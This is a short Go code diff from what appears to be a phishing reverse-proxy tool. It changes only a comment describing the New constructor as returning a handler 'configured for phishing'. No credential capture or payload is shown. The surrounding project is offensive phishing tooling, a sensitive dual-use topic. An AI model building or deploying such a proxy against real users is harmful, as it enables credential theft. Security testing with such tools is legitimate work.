@@ -100,7 +100,7 @@ func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
 	p.reverseProxy.ServeHTTP(w, r)
 }
 
-// New returns a http.Server configured for phishing.
+// New returns a HTTP handler configured for phishing.
 func New(config *Config) *ProxyServer {
 	phishingProxy := &phishingProxy{Config: config}
 	reverseProxy := &httputil.ReverseProxy{
